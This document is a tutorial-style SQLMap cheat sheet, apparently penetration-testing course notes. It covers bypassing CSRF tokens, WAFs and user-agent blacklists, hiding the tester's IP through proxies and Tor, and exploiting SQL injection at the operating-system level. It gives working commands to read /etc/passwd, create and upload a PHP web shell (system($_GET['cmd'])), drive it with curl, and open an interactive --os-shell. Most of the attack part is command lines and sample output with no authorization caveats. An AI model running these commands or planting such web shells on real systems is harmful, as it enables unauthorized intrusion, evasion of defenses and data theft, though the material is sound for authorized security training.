# Bypassing Web Application Protections

## Anti-CSRF Token Bypass

Apps use CSRF tokens to ensure requests come from real browser sessions. SQLMap can handle this automatically.

```bash
sqlmap -u "http://target.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

- SQLMap parses the response to grab a fresh token before each request
- If you don't specify `--csrf-token` but the parameter name contains `csrf`, `xsrf`, or `token`, SQLMap will prompt you to update it automatically

## Unique Value Bypass

Some apps require a unique value per request (not a full CSRF token, just randomness). Use `--randomize` to generate a new value each time.

```bash
sqlmap -u "http://target.com/?id=1&rp=29125" --randomize=rp --batch
```

SQLMap will send a different `rp` value with every request.

## Calculated Parameter Bypass

When one parameter's value depends on another (e.g. `h=MD5(id)`), use `--eval` to run Python code before each request.

```bash
sqlmap -u "http://target.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" \
  --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
```

The `h` parameter gets recalculated correctly every time `id` changes.

## IP Concealment

**Single proxy:**

```bash
--proxy="socks4://177.39.187.70:33283"
```

**Proxy list (rotates on blacklist):**

```bash
--proxy-file=/path/to/proxies.txt
```

**Tor:**

```bash
--tor               # auto-detects local SOCKS4 on port 9050/9150
--check-tor         # verifies Tor is working via torproject.org
```

## WAF Detection & Bypass

SQLMap automatically tests for WAFs on startup by sending a malicious-looking payload on a fake parameter. If a WAF is detected, it uses `identYwaf` (signatures for 80 WAF solutions) to identify it.

To skip WAF detection (less noise):

```bash
--skip-waf
```

## User-Agent Blacklist Bypass

SQLMap's default User-Agent (`sqlmap/1.4.9...`) is widely known and often blocked. If you're getting 5XX errors immediately:

```bash
--random-agent      # picks a random browser UA from a large pool
```

## Tamper Scripts

Tamper scripts modify payloads just before sending â€” the main tool for bypassing WAF/IPS rules.

```bash
--tamper=between,randomcase     # chain multiple scripts
--list-tampers                  # see all available scripts
```

Scripts run in predefined priority order to avoid breaking payloads.

## Miscellaneous Bypasses

**Chunked transfer encoding** â€“ splits POST body into chunks, breaking up blacklisted keywords across chunk boundaries:

```bash
--chunked
```

**HTTP Parameter Pollution (HPP)** â€“ splits payload across repeated parameter names:

```
?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users
```

Works on platforms that concatenate duplicate params (e.g. ASP). SQLMap handles this internally when applicable.

# OS Exploitation

SQLMap can use SQL injection to read and write files on the target server, and even get direct command execution if you have the right privileges.

## File Read/Write Basics

Reading files is much more common than writing them. Modern DBMSes restrict file writing because it can lead to full system takeover (e.g., uploading a web shell).

In MySQL, reading files needs `LOAD DATA` and `INSERT` privileges. Example raw SQL:

```sql
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
```

You don't always need DBA privileges to read files, but having them makes it much more likely to work.

## Checking DBA Privileges

Use `--is-dba` to check if the current database user has admin rights:

```bash
sqlmap -u "http://target.com/page.php?id=1" --is-dba
```

**Output:**

- `current user is DBA: False` â†’ probably can't read/write files
    
- `current user is DBA: True` â†’ good chance you can read files
    

## Reading Local Files

Use `--file-read` to fetch a file from the remote server:

```bash
sqlmap -u "http://target.com/page.php?id=1" --file-read "/etc/passwd"
```

SQLMap downloads the file and saves it locally at:
```plain
~/.sqlmap/output/[target]/files/_etc_passwd
```

View it with:

```bash
cat ~/.sqlmap/output/target.com/files/_etc_passwd
```

If retrieval fails, SQLMap suggests trying `--no-cast` or `--hex`.

## Writing Local Files

Writing files is heavily restricted in modern DBMSes. MySQL needs `--secure-file-priv` disabled, and you need write permissions on the target directory. Still, many web apps need DB file writes, so it's worth testing.

### Step 1: Create a Web Shell Locally
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Step 2: Write It to the Remote Server

```bash
sqlmap -u "http://target.com/page.php?id=1"   --file-write "shell.php"   --file-dest "/var/www/html/shell.php"
```

SQLMap confirms by comparing file sizes.

### Step 3: Use the Shell
```bash
curl http://target.com/shell.php?cmd=ls+-la
```

## OS Command Execution (`--os-shell`)

SQLMap can drop you into an interactive shell without manually uploading files.

### Basic Command
```bash
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

### How It Works

- Uploads a UDF (User Defined Function) binary
    
- Creates `sys_exec` and `sys_eval` functions
    
- Uses these to run OS commands through SQL injection
    

### If No Output Appears

The default technique might fail. Force error-based injection:
```bash
sqlmap -u "http://target.com/page.php?id=1" --os-shell --technique=E
```

### Interactive Prompts

SQLMap will ask:

1. **Web language?** â†’ usually PHP (option 4)
    
2. **Web root directory?** â†’ option 1 for common locations (`/var/www/html`, `/var/www/htdocs`, etc.)
    

Add `--batch` to auto-select defaults and skip prompts.

### Example Successful Session

```plain
os-shell> ls -la
do you want to retrieve the command standard output? [Y/n/a] a

command standard output:
---
total 156
drwxrwxrwt 1 www-data www-data 4096 Nov 19 18:06 .
...
```
